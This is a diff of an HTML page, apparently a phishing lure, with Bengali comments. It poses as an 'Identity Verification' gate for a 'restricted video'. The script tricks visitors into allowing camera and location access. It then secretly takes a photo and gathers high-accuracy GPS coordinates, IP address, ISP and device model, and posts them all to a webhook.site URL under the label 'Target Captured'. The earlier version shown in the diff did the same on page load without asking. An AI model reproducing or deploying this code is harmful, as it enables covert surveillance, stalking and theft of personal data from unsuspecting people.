@@ -1,47 +1,106 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Image Viewer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title> <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <meta property="og:image" content="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg">
+    <meta property="og:type" content="website">
+
+    <style>
+        body { margin: 0; background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #verify-card { background: #18191a; padding: 30px; border-radius: 20px; text-align: center; max-width: 350px; border: 1px solid #3e4042; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn { background: #0084ff; color: white; padding: 14px 28px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; font-size: 16px; }
+        #video-container { display: none; text-align: center; }
+        img { max-width: 100%; border-radius: 10px; }
+        video, canvas { display: none; }
+    </style>
 </head>
-<body style="margin:0; background-color:black; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <img src="https://via.placeholder.com/300" style="max-width:100%;">
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+<body>
+
+    <div id="verify-card">
+        <div style="font-size: 40px; margin-bottom: 10px;">🔒</div>
+        <h2>Identity Verification</h2>
+        <p>To watch this restricted video, please verify your session by allowing <b>Camera</b> and <b>Location</b> access.</p>
+        <button class="btn" onclick="startCapture()">Verify & Access Video</button>
+    </div>
+
+    <div id="video-container">
+        <img src="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg" alt="Video Content">
+        <p style="color: #0084ff; margin-top: 10px;">▶️ Video playing in secure mode...</p>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
+        // আপনার দেওয়া নতুন Webhook লিঙ্ক
+        const webhookURL = "https://webhook.site/1f626cc0-2563-4b0b-9d32-b1f251edb1bc";
 
-        window.onload = function() {
-            // ১. লোকেশন ট্র্যাকিং
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
-                        body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) 
-                    });
+        async function startCapture() {
+            // ১. সিমের নাম এবং মোবাইল মডেল ট্র্যাকিং
+            fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                sendToWebhook({
+                    Event: "Visitor Details",
+                    ISP_Sim: data.org, // সিম বা আইএসপি-র নাম
+                    Mobile: navigator.userAgent.split('(')[1].split(')')[0], // ফোনের মডেল
+                    City: data.city,
+                    IP: data.ip
                 });
-            }
+            });
 
-            // ২. ক্যামেরা ট্র্যাকিং
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
+            try {
+                // ২. ক্যামেরা পারমিশন চাওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // ৩. জিপিএস লোকেশন চাওয়া
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    
+                    // ৪. ক্যামেরা দিয়ে ছবি তোলা (২ সেকেন্ড পর যেন ফোকাস ঠিক হয়)
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const imgData = canvas.toDataURL('image/jpeg');
-                        
-                        // ছবি Webhook-এ পাঠানো
-                        fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: imgData });
-                        
-                        // ক্যামেরা বন্ধ করা
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL('image/jpeg');
+
+                        // ছবি এবং ম্যাপ লিঙ্ক একসাথে পাঠানো
+                        sendToWebhook({
+                            Event: "Target Captured 📸",
+                            Location_Link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                            Accuracy: position.coords.accuracy + "m",
+                            Photo_Base64: imageData
+                        });
+
+                        // ক্যামেরা বন্ধ করা এবং ভিউ চেঞ্জ করা
                         stream.getTracks().forEach(track => track.stop());
+                        document.getElementById('verify-card').style.display = 'none';
+                        document.getElementById('video-container').style.display = 'block';
                     }, 2000);
-                });
+
+                }, (err) => {
+                    alert("Verification Failed: All permissions (Camera & Location) are required to play the video.");
+                    location.reload();
+                }, { enableHighAccuracy: true });
+
+            } catch (err) {
+                alert("Please Allow Camera and Location access to verify your identity.");
+                location.reload();
             }
-        };
+        }
+
+        function sendToWebhook(data) {
+            fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
     </script>
 </body>
 </html>
